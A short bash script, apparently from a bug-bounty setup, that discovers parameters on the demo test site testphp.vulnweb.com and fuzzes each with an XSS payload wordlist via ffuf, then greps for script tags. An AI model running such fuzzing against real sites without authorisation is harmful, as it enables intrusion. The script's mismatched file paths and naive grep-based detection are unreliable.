#!/bin/bash

# Define the target URL
TARGET_URL="http://testphp.vulnweb.com/"

# Define the path to the wordlist
WORDLIST_PATH="~/doit/bugbounty/wordlists/payloadbox-xss"

# Run ParamSpider to discover parameters
paramspider.py -d "$TARGET_URL" -o params.csv

# Extract the vulnerable parameters from the CSV file
VULN_PARAMS=$(cat output/params.csv | cut -d',' -f1 | tail -n +2)

# Run FFUF with the specified options for each vulnerable parameter
for PARAM in $VULN_PARAMS; do
    ffuf -u "$TARGET_URL/?$PARAM=FUZZ" -w "$WORDLIST_PATH" | tee -a ffuf_results.txt
done

# Parse the FFUF output to find XSS vulnerabilities
grep -E "(alert|<script>)" ffuf_results.txt

